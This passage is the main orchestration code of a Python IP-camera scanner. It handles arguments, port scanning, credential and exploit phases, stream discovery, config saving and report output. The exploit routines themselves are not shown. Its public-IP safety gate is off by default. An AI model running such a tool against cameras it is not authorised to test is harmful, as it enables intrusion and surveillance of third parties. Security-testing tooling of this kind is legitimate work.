            ctx.logger.warning(f"Config from port {port} exceeds 50MB limit ({len(data)} bytes)")
        return None
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"{port}_config_{ts}.bin"
    out_dir = ctx.configs_dir or "."
    path = os.path.join(out_dir, fname)
    try:
        with open(path, "wb") as f:
            f.write(data)
        if ctx.logger:
            ctx.logger.info(f"Saved config to {path}")
        cprint(f"      💾 Saved config → {path}", G)
        return path
    except Exception as e:
        if ctx.logger:
            ctx.logger.error(f"Failed to save config to {path}: {e}")
        return None

def setup_session_dirs(
    ip: str,
    args: argparse.Namespace,
    timestamp: str,
) -> Tuple[str, str, str, str, str, str]:
    safe_ip = ip.replace(".", "_").replace(":", "_")
    if args.output:
        base_root = os.path.abspath(os.path.expanduser(args.output))
    else:
        base_root = os.path.join(os.getcwd(), "cctv_results")
    if getattr(args, "flat", False):
        os.makedirs(base_root, exist_ok=True)
        return base_root, base_root, base_root, base_root, base_root, base_root
    sess_dir = os.path.join(base_root, f"{timestamp}_{safe_ip}")
    rep_dir = os.path.join(sess_dir, "reports")
    log_dir = os.path.join(sess_dir, "logs") if getattr(args, "log", False) else ""
    snap_dir = os.path.join(sess_dir, "snapshots")
    cfg_dir = os.path.join(sess_dir, "configs")
    str_dir = os.path.join(sess_dir, "streams")
    dirs = [rep_dir, snap_dir, cfg_dir, str_dir]
    if log_dir:
        dirs.append(log_dir)
    for d in dirs:
        os.makedirs(d, exist_ok=True)
    return sess_dir, rep_dir, log_dir, snap_dir, cfg_dir, str_dir

def setup_logging(logs_dir: Optional[str], verbose: bool) -> logging.Logger:
    logger = logging.getLogger("cctvscanner")
    logger.setLevel(logging.DEBUG)
    logger.handlers.clear()
    fmt = logging.Formatter(
        "%(asctime)s │ %(levelname)-7s │ %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    if logs_dir:
        os.makedirs(logs_dir, exist_ok=True)
        dh = logging.FileHandler(os.path.join(logs_dir, "scan.log"), encoding="utf-8")
        dh.setLevel(logging.DEBUG if verbose else logging.INFO)
        dh.setFormatter(fmt)
        logger.addHandler(dh)
        eh = logging.FileHandler(os.path.join(logs_dir, "errors.log"), encoding="utf-8")
        eh.setLevel(logging.ERROR)
        eh.setFormatter(fmt)
        logger.addHandler(eh)
        logger.info("Logging started")
    return logger

def _apply_lang_from_argv() -> None:
    if "-ru" in sys.argv or "--ru" in sys.argv:
        set_lang("ru", persist=False)
    elif "--en" in sys.argv:
        set_lang("en", persist=False)
    else:
        cfg = _load_config()
        if cfg.get("lang") == "ru":
            set_lang("ru", persist=False)

def get_args() -> argparse.Namespace:
    _apply_lang_from_argv()
    p = argparse.ArgumentParser(
        prog="CCTVSCANNER.py",
        description=t("help_desc"),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("target", nargs="?", help=t("h_target"))
    p.add_argument("-f", "--file", metavar="FILE", help=t("h_file"))
    p.add_argument("-t", "--timeout", type=float, default=3.5, metavar="SEC", help=t("h_timeout"))
    p.add_argument("-T", "--threads", type=int, default=350, metavar="N", help=t("h_threads"))
    p.add_argument("-p", "--ports", metavar="PORTS", help=t("h_ports"))
    p.add_argument("-o", "--output", metavar="DIR/PREFIX", help=t("h_output"))
    p.add_argument("--top-ports", type=int, default=0, metavar="N", help=t("h_top_ports"))
    p.add_argument("--full", action="store_true", help=t("h_full"))
    p.add_argument("--force", action="store_true", help=t("h_force"))
    p.add_argument("--no-creds", action="store_true", help=t("h_no_creds"))
    p.add_argument("--no-exploit", action="store_true", help=t("h_no_exploit"))
    p.add_argument("--no-streams", action="store_true", help=t("h_no_streams"))
    p.add_argument("--no-auth-pages", action="store_true", help=t("h_no_auth"))
    p.add_argument("--no-onvif", action="store_true", help=t("h_no_onvif"))
    p.add_argument("--no-tls", action="store_true", help=t("h_no_tls"))
    p.add_argument("--no-html", action="store_true", help=t("h_no_html"))
    p.add_argument("--no-json", action="store_true", help=t("h_no_json"))
    p.add_argument("-v", "--verbose", action="store_true", help=t("h_verbose"))
    p.add_argument("-ru", "--ru", action="store_true", help=t("h_ru"))
    p.add_argument("--en", action="store_true", help=t("h_en"))
    p.add_argument("--log", action="store_true", help=t("h_log"))
    p.add_argument("--udp", action="store_true", help=t("h_udp"))
    p.add_argument("--snmp", action="store_true", help=t("h_snmp"))
    p.add_argument("--p0f", action="store_true", help=t("h_p0f"))
    p.add_argument("--sarif", metavar="PATH", help=t("h_sarif"))
    p.add_argument("--md", metavar="PATH", help=t("h_md"))
    p.add_argument("--stix", metavar="PATH", help=t("h_stix"))
    p.add_argument("--http2", action="store_true", help=t("h_http2"))
    p.add_argument("--http3", action="store_true", help=t("h_http3"))
    p.add_argument("--resume", metavar="FILE", help=t("h_resume"))
    p.add_argument("--rate", type=float, default=0.0, metavar="N", help=t("h_rate"))
    p.add_argument("--proxy", metavar="URL", help=t("h_proxy"))
    p.add_argument("--user-agent", metavar="STR", help=t("h_ua"))
    p.add_argument("--concurrent-hosts", type=int, default=1, metavar="N", help=t("h_hosts"))
    p.add_argument("--exclude", metavar="IP/CIDR", help=t("h_exclude"))
    p.add_argument("--ports-file", metavar="FILE", help=t("h_ports_file"))
    p.add_argument("--creds-file", metavar="FILE", help=t("h_creds_file"))
    p.add_argument("--cve-file", metavar="FILE", help=t("h_cve_file"))
    p.add_argument("--safety-gate", action="store_true", default=False, help=t("h_safety"))
    p.add_argument("--no-safety-gate", action="store_true", default=False, help=t("h_no_safety"))
    p.add_argument("--i-own-this", action="store_true", default=False, help=t("h_own"))
    p.add_argument("--flat", action="store_true", help=t("h_flat"))
    p.add_argument("--save-snapshots", action="store_true", help=t("h_snap"))
    p.add_argument("--save-config", action="store_true", help=t("h_cfg"))
    p.add_argument("-q", "--quiet", action="store_true", help=t("h_quiet"))
    p.add_argument("--brands", metavar="LIST", help=t("h_brands"))
    p.add_argument("--max-auth-paths", type=int, default=0, metavar="N", help=t("h_max_auth"))
    p.add_argument("--max-stream-paths", type=int, default=0, metavar="N", help=t("h_max_stream"))
    p.add_argument("--priority-paths", action="store_true", help=t("h_priority"))
    return p.parse_args()
def _resolve_ports(args: argparse.Namespace, spec_port: Optional[int]) -> List[int]:
    ports: List[int] = []
    if args.ports_file and os.path.isfile(args.ports_file):
        with open(args.ports_file, encoding="utf-8") as f:
            for l in f:
                p_str = l.strip()
                if p_str.isdigit():
                    ports.append(int(p_str))
    elif args.ports:
        ports = [int(x) for x in args.ports.split(",") if x.strip().isdigit()]
    elif args.top_ports:
        ports = PORTS_CAM[:args.top_ports]
    elif getattr(args, "full", False):
        ports = list(dict.fromkeys(PORTS_ALL))
    else:
        ports = list(dict.fromkeys(PORTS_CAM))
    if spec_port and spec_port not in ports:
        ports.insert(0, spec_port)
    return ports

def _probe_advanced_services(
    ip: str,
    open_ports: List[int],
    args: argparse.Namespace,
    ctx: ScanContext,
    report: Report,
) -> None:
    if args.udp:
        report.udp_info = probe_udp_services(ip, 0.5)
    if args.snmp:
        report.snmp_info = probe_snmp(ip, 0.5)
    if args.p0f:
        report.tcp_fp = tcp_ip_fingerprint(ip, open_ports, args.timeout)
    sess = make_session(proxy=args.proxy, user_agent=args.user_agent)
    for p in [p for p in open_ports if p not in SKIP_PORTS and p not in RTSP_PORTS_SET][:4]:
        pr = proto(p)
        for f in probe_http_methods(ip, p, pr, args.timeout, ctx, sess):
            report.add_finding(f)
        for f in probe_web_vulns(ip, p, pr, args.timeout, ctx, sess):
            report.add_finding(f)
        for f in probe_graphql_api(ip, p, pr, args.timeout, ctx, sess):
            report.add_finding(f)
        if args.http2 or args.http3:
            h2, h3 = probe_http2_http3(ip, p, args.timeout, sess)
            if h2:
                report.http2_ports.append(p)
            if h3:
                report.http3_ports.append(p)

def scan_target(ip: str, spec_port: Optional[int], args: argparse.Namespace, ctx: ScanContext) -> Report:
    report = Report(ip)
    ctx.form_cache.clear()
    ports = _resolve_ports(args, spec_port)
    try:
        ipo = ipaddress.ip_address(ip)
        priv = ipo.is_private
    except ValueError:
        priv = False
    cprint(f"\n[🌍] Target: {ip}  ({'Private/LAN' if priv else 'Public/Internet'})", C)
    open_ports, rtsp_ports, banners = run_portscan(ip, ports, args.timeout, args.threads, ctx)
    report.open_ports = open_ports
    report.rtsp_ports = rtsp_ports
    report.banners = {k: v for k, v in banners.items()}
    if spec_port and spec_port not in open_ports:
        open_ports.append(spec_port)
    if not open_ports:
        cprint("[❌] No open ports discovered on target. Finalizing.", R)
        return report
    cprint("\n  → TLS analysis...", C)
    if not args.no_tls:
        tls_p = [p for p in open_ports if p in HTTPS_PORTS]
        if tls_p:
            section(f"🔒 TLS Certificate Analysis ({len(tls_p)} ports)")
            for p in tls_p:
                info = grab_tls_cert(ip, p, args.timeout)
                if info:
                    report.tls_info[p] = info
                    cn = info.get("subject_cn", "?")
                    exp = info.get("not_after", "?")
                    cprint(f"  [:{p}] CN={cn}  Expires={exp}", G)
    cprint("\n  → UDP discovery...", C)
    _probe_advanced_services(ip, open_ports, args, ctx, report)
    cprint("\n  → Auth pages...", C)
    if not args.no_auth_pages:
        run_auth_pages(ip, open_ports, report, args.timeout, ctx=ctx)
    cprint("\n  → Fingerprinting...", C)
    brands = run_fingerprint(ip, open_ports, report, args.timeout, ctx=ctx)
    cprint("\n  → Credentials...", C)
    if not args.no_creds and getattr(args, "full", False):
        run_creds(ip, open_ports, report, args.timeout, ctx=ctx)
    cprint("\n  → Streams...", C)
    if not args.no_streams:
        run_streams(ip, open_ports, rtsp_ports, report, args.timeout, ctx=ctx)
    cprint("\n  → CVE checks...", C)
    if not args.no_exploit and getattr(args, "full", False):
        run_exploits(ip, open_ports, brands, report, args.timeout, ctx=ctx)
    report.finished = datetime.now(timezone.utc).isoformat()
    return report
def _collect_raw_targets(args: argparse.Namespace) -> List[str]:
    raw_targets: List[str] = []
    if args.file:
        raw_targets = expand_targets(args.file)
    elif args.target:
        raw_targets = expand_targets(args.target)
    else:
        try:
            user_in = input(f"{G}[+] {C}{t('enter_target')}{W}").strip()
            if not user_in:
                cprint(f"[!] {t('no_target_entered')}", R)
                sys.exit(1)
            raw_targets = expand_targets(user_in)
        except (KeyboardInterrupt, EOFError):
            print()
            sys.exit(0)
    raw_targets = filter_excluded(raw_targets, args.exclude)
    if args.resume and os.path.isfile(args.resume):
        try:
            with open(args.resume, encoding="utf-8") as f:
                prev_data = json.load(f)
                prev_ip = prev_data.get("ip")
                if prev_ip in raw_targets:
                    raw_targets.remove(prev_ip)
        except Exception:
            pass
    return raw_targets

def _is_writable(path: str) -> bool:
    try:
        pdir = os.path.dirname(os.path.abspath(path))
        if not os.path.exists(pdir):
            os.makedirs(pdir, exist_ok=True)
        return os.access(pdir, os.W_OK)
    except Exception:
        return False

def _safe_write_report(fn: Callable[[str], None], path: str, logger: Optional[logging.Logger]) -> None:
    if not _is_writable(path):
        if logger:
            logger.error(f"Cannot write report to {path}: path not writable")
        cprint(f"  [!] Cannot write report to {path}: path not writable", Y)
        return
    try:
        fn(path)
    except Exception as e:
        if logger:
            logger.error(f"Failed writing report {path}: {e}")
        cprint(f"  [!] Failed writing report {path}: {e}", Y)

def _save_reports(
    report: Report,
    ctx: ScanContext,
    safe_ip: str,
    args: argparse.Namespace,
    is_single: bool,
) -> None:
    if getattr(args, "flat", False):
        if args.output:
            out_prefix = os.path.abspath(os.path.expanduser(args.output))
        else:
            out_prefix = os.path.join(os.getcwd(), "cctv_results", f"cctv_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        parent = os.path.dirname(out_prefix)
        if parent:
            os.makedirs(parent, exist_ok=True)
        json_path = f"{out_prefix}.json" if is_single else f"{out_prefix}_{safe_ip}.json"
        html_path = f"{out_prefix}.html" if is_single else f"{out_prefix}_{safe_ip}.html"
        md_path = args.md if is_single else (f"{args.md}_{safe_ip}.md" if args.md else "")
        sarif_path = args.sarif if is_single else (f"{args.sarif}_{safe_ip}.sarif" if args.sarif else "")
        stix_path = args.stix if is_single else (f"{args.stix}_{safe_ip}.stix" if args.stix else "")
    else:
        rep_dir = ctx.reports_dir or "."
        json_path = os.path.join(rep_dir, f"report_{safe_ip}.json" if not is_single else "report.json")
        html_path = os.path.join(rep_dir, f"report_{safe_ip}.html" if not is_single else "report.html")
        md_path = os.path.join(rep_dir, f"report_{safe_ip}.md" if not is_single else "report.md") if args.md else ""
        sarif_path = os.path.join(rep_dir, f"report_{safe_ip}.sarif" if not is_single else "report.sarif") if args.sarif else ""
        stix_path = os.path.join(rep_dir, f"report_{safe_ip}.stix" if not is_single else "report.stix") if args.stix else ""

    if not args.no_json:
        _safe_write_report(report.save_json, json_path, ctx.logger)
    if not args.no_html:
        _safe_write_report(report.save_html, html_path, ctx.logger)
    if md_path:
        _safe_write_report(report.save_markdown, md_path, ctx.logger)
    if sarif_path:
        _safe_write_report(report.save_sarif, sarif_path, ctx.logger)
    if stix_path:
        _safe_write_report(report.save_stix, stix_path, ctx.logger)

    if ctx.streams_dir and report.streams:
        st_file = os.path.join(ctx.streams_dir, "streams.txt")
        if _is_writable(st_file):
            try:
                with open(st_file, "a", encoding="utf-8") as f:
                    for s in report.streams:
                        f.write(f"{s}\n")
            except Exception as e:
                if ctx.logger:
                    ctx.logger.error(f"Failed writing streams.txt: {e}")

def main() -> None:
    _apply_lang_from_argv()
    if "-ru" in sys.argv or "--ru" in sys.argv:
        set_lang("ru", persist=True)
    elif "--en" in sys.argv:
        set_lang("en", persist=True)
    banner()
    if "-ru" in sys.argv or "--ru" in sys.argv:
        cprint(f"  {t('lang_set_ru')}", G)
    elif "--en" in sys.argv:
        cprint(f"  {t('lang_set_en')}", G)
    args = get_args()
    raw_targets = _collect_raw_targets(args)
    if not raw_targets:
        cprint(f"[!] {t('no_targets')}", R)
        sys.exit(1)
    for raw in raw_targets:
        tgt_ip, _ = parse_target(raw)
        if not is_safe_target(tgt_ip):
            if args.safety_gate and not args.no_safety_gate and not args.i_own_this:
                if not confirm_public_target(tgt_ip):
                    cprint(t("public_err", ip=tgt_ip), R)
                    sys.exit(1)
            else:
                if not args.no_safety_gate and not args.i_own_this:
                    if getattr(args, "verbose", False):
                        cprint(f"[!] Notice: Target {tgt_ip} is a public IP. Safety gate is disabled by default. (Use --safety-gate to enforce)", Y)
    cprint(f"\n[ℹ️] {t('queued', n=len(raw_targets))}", C)
    all_reports: List[Report] = []
    ts = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    for idx, raw in enumerate(raw_targets, 1):
        if len(raw_targets) > 1:
            cprint(f"\n{'─' * 68}", B)
            cprint(f"  {t('target_n', i=idx, n=len(raw_targets), raw=raw)}", BOLD)
        ip, spec_port = parse_target(raw)
        if not validate_ip(ip):
            continue
        s_dir, r_dir, l_dir, sn_dir, c_dir, st_dir = setup_session_dirs(ip, args, ts)
        logger = None
        if getattr(args, "log", False):
            logger = setup_logging(l_dir, args.verbose)
        else:
            l_dir = ""
        ctx = ScanContext(args, s_dir, r_dir, l_dir, sn_dir, c_dir, st_dir, logger)
        try:
            report = scan_target(ip, spec_port, args, ctx)
            all_reports.append(report)
            print_summary(ip, report)
            safe_ip = ip.replace(".", "_").replace(":", "_")
            _save_reports(report, ctx, safe_ip, args, len(raw_targets) == 1)
        except KeyboardInterrupt:
            cprint(f"\n\n[!] {t('interrupted')}", Y)
            if all_reports:
                all_reports[-1].save_json(os.path.join(r_dir, "partial_report.json"))
            sys.exit(0)
        except Exception as e:
            cprint(f"\n[!] Error scanning host {ip}: {e}", R)
            vprint(f"Details: {e}", ctx)
    if len(all_reports) > 1:
        multi_target_summary(all_reports)
    cprint(f"\n[✅] {t('done')}\n", G)

if __name__ == "__main__":
    main()
